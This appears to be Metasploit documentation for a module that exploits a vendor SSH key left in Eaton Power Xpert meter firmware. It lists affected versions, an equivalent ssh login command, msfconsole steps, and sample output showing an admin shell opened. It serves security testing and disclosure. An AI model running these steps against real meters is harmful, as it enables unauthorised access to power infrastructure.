# Description
  
  The `eaton_xpert_backdoor` module scans for Eaton Xpert Power meters with a vendor SSH private key used in the device firmware's build process.

## Vulnerable Application

  Eaton is a power management company with a wide range of power management products.
  Power meters sold by Eaton used a firmware build process for many years that left a developer key pair in the default profile.
  Specific models include: Power Xpert Meter 4000/6000/8000

  [Software Link](http://www.eaton.com/Eaton/ProductsServices/Electrical/ProductsandServices/PowerQualityandMonitoring/PowerandEnergyMeters/PowerXpertMeter400060008000/index.htm#tabs-2)

  Vulnerable Version: Firmware <= 12.x and <= 13.3.x.x and below more versions may be impacted

  Tested on: Firmware 12.1.9.1 and 13.3.2.10

  Similar to running: `ssh -m hmac-sha1 -c aes128-cbc -o KexAlgorithms=diffie-hellman-group1-sha1 -o HostKeyAlgorithms=ssh-rsa  -i ./id_rsa admin@1.1.1.2`

## Verification Steps

  1. Start `msfconsole`
  2. `use auxiliary/scanner/ssh/eaton_xpert_backdoor`
  3. `set RHOSTS 1.1.1.2`
  4. `run -z`
  5. Vulnerable hosts should present a shell

## Scenarios

```
msf > use auxiliary/scanner/ssh/eaton_xpert_backdoor
msf auxiliary(scanner/ssh/eaton_xpert_backdoor) > set RHOSTS 1.1.1.2
RHOSTS => 1.1.1.2
msf auxiliary(scanner/ssh/eaton_xpert_backdoor) > run -z

[+] 1.1.1.2:22 - Logged in as admin
[*] Command shell session 1 opened (1.1.1.1:62063 -> 1.1.1.2:22) at 2018-08-31 19:12:21 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
